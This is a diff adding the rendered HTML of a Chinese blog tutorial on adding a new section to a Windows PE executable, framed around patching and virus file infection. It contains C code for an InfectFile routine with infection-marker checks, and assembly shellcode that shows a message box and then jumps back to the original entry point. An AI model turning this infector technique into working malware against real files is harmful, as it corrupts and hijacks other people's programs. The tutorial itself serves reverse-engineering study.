@@ -1,38 +1,1021 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!doctype html>
 
 
-{% block title %} {{ page.title }} | {{ config.title }} {% endblock %}
-
-{% block page_class %}page-post-detail{% endblock %}
 
 
-{% block content %}
+<html class="theme-next mist" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="google-site-verification" content="-rILWvtgf7gbffrRwk-E1VWNCVLMTcq6pxgs_1IfIjo" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="PE文件,添加节区,病毒感染,打补丁" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="0x4C43's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。 打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙">
+<meta name="keywords" content="PE文件,添加节区,病毒感染,打补丁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PE文件中添加节区">
+<meta property="og:url" content="http://0x4c43.cn/PE文件中添加节区/index.html">
+<meta property="og:site_name" content="0x4C43's Blog">
+<meta property="og:description" content="在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。 打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-21/52134100.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-21/41073536.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-21/28635670.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-21/90730788.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-21/63364761.jpg">
+<meta property="og:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-23/33815689.jpg">
+<meta property="og:updated_time" content="2017-07-24T07:59:44.130Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PE文件中添加节区">
+<meta name="twitter:description" content="在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。 打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙">
+<meta name="twitter:image" content="http://ooyovxue7.bkt.clouddn.com/17-7-21/52134100.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0x4c43.cn/PE文件中添加节区/"/>
+
+
+
+
+
+
+
+  <title> PE文件中添加节区 | 0x4C43's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0x4C43's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/PE文件中添加节区/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0x4C43">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0x4C43's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                PE文件中添加节区
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-23T16:30:10+08:00">
+                2017-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows/" itemprop="url" rel="index">
+                    <span itemprop="name">Windows</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/PE文件中添加节区/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。</p>
+<p>打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙中。对于恶意代码而言，以这种方式感染目标文件更具隐蔽性。</p>
+<p>当补丁代码或病毒需注入的代码量较大时，可以在 PE 文件的末尾添加一个节区用于存储这些代码。下面介绍如何在 PE 文件中添加一个节区。</p>
+<h3 id="0x01-手动添加"><a href="#0x01-手动添加" class="headerlink" title="0x01 手动添加"></a><strong>0x01 手动添加</strong></h3><p>使用 C32asm 可以很方便地定位并修改 PE 文件的各个字段，点击 “查看” / “PE信息” 可打开 PE 结构字段的解析面板。添加节区的具体流程如下。</p>
+<h4 id="1）添加一个-IMAGE-SECTION-HEADER"><a href="#1）添加一个-IMAGE-SECTION-HEADER" class="headerlink" title="1）添加一个 IMAGE_SECTION_HEADER"></a><strong>1）添加一个 IMAGE_SECTION_HEADER</strong></h4><p>首先在原来节表的末尾添加一个节表，IMAGE_SECTION_HEADER 结构体中要设置的字段有以下6个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name: .new</div><div class="line">VirtualSize: 0x450 // 该字段可不用对齐</div><div class="line">VirtualAddress: 0x9000 // 上一节区的 VirtualAddress + 对齐后的 VirtualSize</div><div class="line">SizeOfRawData: 0x600 // 该字段为对齐后的值</div><div class="line">PointerToRawData: 0x5200 // 上一节区的 PointerToRawData + SizeOfRawData</div><div class="line">Characteristics：0x60000020  // 与 .text段一致</div></pre></td></tr></table></figure></p>
+<p><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/52134100.jpg" alt=""></p>
+<h4 id="2）修改-NumberOfSection"><a href="#2）修改-NumberOfSection" class="headerlink" title="2）修改 NumberOfSection"></a><strong>2）修改 NumberOfSection</strong></h4><p>添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/41073536.jpg" alt=""></p>
+<h4 id="3）修改-SizeOfImage"><a href="#3）修改-SizeOfImage" class="headerlink" title="3）修改 SizeOfImage"></a><strong>3）修改 SizeOfImage</strong></h4><p>接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/28635670.jpg" alt=""></p>
+<h4 id="4）添加节区数据"><a href="#4）添加节区数据" class="headerlink" title="4）添加节区数据"></a><strong>4）添加节区数据</strong></h4><p>最后添加新增节区的数据，把光标移到文件的末尾，点击 “编辑” / “插入数据”，插入数据大小为 1536(0x600)，使用 00 填充，点击确认，保存即可。</p>
+<p>到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/90730788.jpg" alt=""></p>
+<p><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/63364761.jpg" alt=""></p>
+<p>这里需要注意插入数据的大小要按磁盘对齐方式对齐，不然最终修改后的文件无法运行，并提示“该文件不是有效的 Win32 应用程序”。</p>
+<h3 id="0x02-编程实现"><a href="#0x02-编程实现" class="headerlink" title="0x02 编程实现"></a><strong>0x02 编程实现</strong></h3><p>恶意代码为了实现其隐蔽性，在其感染 PE 文件时会将代码执行权交给被插入的代码，所以恶意代码通常会先被执行，执行完后再跳转至原 PE 文件中的代码继续执行。</p>
+<p>添加节区主要通过内存映射文件和 PE 操作完成，将文件映射到内存中后可以通过内存指针方便地访问文件。下面主要介绍添加新节区的代码实现。</p>
+<h4 id="1）将文件映射到内存"><a href="#1）将文件映射到内存" class="headerlink" title="1）将文件映射到内存"></a><strong>1）将文件映射到内存</strong></h4><p>首先用 CreateFile() 打开文件，然后使用 CreateFileMapping() 和 MapViewOfFile() 函数把文件映射到内存中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( hFile  == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	HANDLE hMapFile = CreateFileMapping(hFile,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!hMapFile)&#123;</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!pHdr)&#123;</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>CreateFileMapping() 函数定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line">	HANDLE                hFile,  <span class="comment">//handle to the file</span></div><div class="line">	LPSECURITY_ATTRIBUTES lpAttributes, <span class="comment">//pointer to SECURITY_ATTRIBUTES structure</span></div><div class="line">	DWORD                 flProtect,  <span class="comment">//page protection of the file mapping object</span></div><div class="line">	DWORD                 dwMaximumSizeHigh,</div><div class="line">	DWORD                 dwMaximumSizeLow,</div><div class="line">	LPCTSTR               lpName</div><div class="line">);</div></pre></td></tr></table></figure></p>
+<p>MapViewOfFile() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line">	HANDLE hFileMappingObject,  <span class="comment">//handle to a file mapping object</span></div><div class="line">	DWORD  dwDesiredAccess, <span class="comment">//type of access to a file mapping object</span></div><div class="line">	DWORD  dwFileOffsetHigh,</div><div class="line">	DWORD  dwFileOffsetLow,</div><div class="line">	SIZE_T dwNumberOfBytesToMap <span class="comment">//number of bytes of a file mapping to map to the view</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
+<h4 id="2）检查-PE-文件"><a href="#2）检查-PE-文件" class="headerlink" title="2）检查 PE 文件"></a><strong>2）检查 PE 文件</strong></h4><p>文件映射后要检查是否为有效的 PE 文件，同时为了避免重复感染，需要检查目标文件是否已被感染。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 判断是否为正常PE文件</span></div><div class="line">	<span class="keyword">if</span> (!IsPeFile(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//判断是否已被感染</span></div><div class="line">	<span class="keyword">if</span> (IsInfected(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>IsPeFile() 和 IsInfected() 函数的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">检查是否为正常PE文件</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsPeFile</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">//判断DOS头标志是否正确</span></div><div class="line">	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="keyword">if</span> (p1-&gt;e_magic != IMAGE_DOS_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//判断PE头标志是否正确</span></div><div class="line">	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1-&gt;e_lfanew);</div><div class="line">	<span class="keyword">if</span> (p2-&gt;Signature != IMAGE_NT_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">判断文件是否被感染</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsInfected</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="comment">//判断DOS头的保留位是否已被填充为 0xABCD</span></div><div class="line">	<span class="keyword">if</span> ( p-&gt;e_res2[<span class="number">0</span>] == (WORD)INFECTFLAG)&#123;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		p-&gt;e_res2[<span class="number">0</span>] = (WORD)INFECTFLAG;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="3）添加节表"><a href="#3）添加节表" class="headerlink" title="3）添加节表"></a><strong>3）添加节表</strong></h4><p>添加一个节区需要在 PE 文件中添加一个节表，此外还需修改 NumberOfSections 和 SizeOfImage 字段。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移</span></div><div class="line">	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//节区头指针： PE头指针+PE头的长度</span></div><div class="line">	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</div><div class="line"></div><div class="line">	<span class="comment">//两个对齐单位</span></div><div class="line">	DWORD dwFileAlign = pNTHdr-&gt;OptionalHeader.FileAlignment;</div><div class="line">	DWORD dwSecAlign  = pNTHdr-&gt;OptionalHeader.SectionAlignment;</div><div class="line">	<span class="comment">//最后一个节指针</span></div><div class="line">	IMAGE_SECTION_HEADER *pLastSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections<span class="number">-1</span>];</div><div class="line">	<span class="comment">//定义一个新节</span></div><div class="line">	IMAGE_SECTION_HEADER *pNewSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections];</div><div class="line">	<span class="comment">//原入口地址（OEP）</span></div><div class="line">	DWORD dwOldOEP = pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint + pNTHdr-&gt;OptionalHeader.ImageBase;</div><div class="line">	<span class="comment">//需插入的代码长度</span></div><div class="line">	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;</div><div class="line"></div><div class="line">	<span class="comment">//填充新节表的各字段</span></div><div class="line">	<span class="built_in">memcpy</span>(pNewSec-&gt;Name,<span class="string">".new"</span>,<span class="number">5</span>);</div><div class="line">	pNewSec-&gt;Misc.VirtualSize = dwCodeSize;</div><div class="line">	pNewSec-&gt;VirtualAddress		=	pLastSec-&gt;VirtualAddress + Align(pLastSec-&gt;Misc.VirtualSize, dwSecAlign);</div><div class="line">	pNewSec-&gt;SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);</div><div class="line">	pNewSec-&gt;PointerToRawData	=	pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</div><div class="line">	pNewSec-&gt;Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;</div><div class="line"></div><div class="line">	<span class="comment">//节区数目加 1</span></div><div class="line">	pNTHdr-&gt;FileHeader.NumberOfSections++;</div><div class="line">	<span class="comment">//修正PE镜像大小</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.SizeOfImage += Align(pNewSec-&gt;Misc.VirtualSize,dwSecAlign);</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>VS2010 中默认设置时，计算 Shellcode 长度时无法正确获取函数在内存中的地址，需要将修改项目属性：配置属性/链接器/常规/关闭增量链接。</p>
+<h4 id="4）插入节区数据"><a href="#4）插入节区数据" class="headerlink" title="4）插入节区数据"></a><strong>4）插入节区数据</strong></h4><p>病毒通常会将带有恶意行为的代码插入新节区的数据段，被插入的代码称为 Shellcode，这里只是插入一段弹消息框的代码，Shellcode 通常使用汇编实现，下面是内联汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">void __declspec(naked) ShellcodeStart()</div><div class="line">&#123;</div><div class="line">	__asm &#123;</div><div class="line">			pushad</div><div class="line">			call    routine</div><div class="line"></div><div class="line">	routine :</div><div class="line">			pop     ebp</div><div class="line">			sub      ebp, offset routine</div><div class="line">			push    0                                // MB_OK</div><div class="line">			lea       eax, [ebp + szCaption]</div><div class="line">			push    eax                              // lpCaption</div><div class="line">			lea	   eax, [ebp + szText]</div><div class="line">			push    eax                              // lpText</div><div class="line">			push    0                                // hWnd</div><div class="line">			mov     eax, 0xAAAAAAAA</div><div class="line">			call      eax                            // MessageBoxA</div><div class="line"></div><div class="line">			popad</div><div class="line">			push    0xBBBBBBBB                       // OEP</div><div class="line">			ret</div><div class="line"></div><div class="line">	szCaption :</div><div class="line">			db(&apos;V&apos;) db(&apos;i&apos;) db(&apos;r&apos;) db(&apos;u&apos;) db(&apos;s&apos;) db(0)</div><div class="line">	szText :</div><div class="line">			db(&apos;I&apos;) db(&apos;n&apos;) db(&apos;f&apos;) db(&apos;l&apos;) db(&apos;e&apos;) db(&apos;c&apos;) db(&apos;t&apos;) db(&apos; &apos;) db(&apos;s&apos;)</div><div class="line">			db(&apos;u&apos;) db(&apos;c&apos;) db(&apos;c&apos;) db(&apos;e&apos;) db(&apos;s&apos;) db(&apos;s&apos;) db(&apos; &apos;) db(&apos;!&apos;) db(0)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>从以上代码可知，Shellcode 执行完后会 ret 到原入口地址（OEP）处继续执行。Shellcode 中 MessageBoxA 函数的地址和 OEP 只是占位符，需要在运行时修正这两个地址。</p>
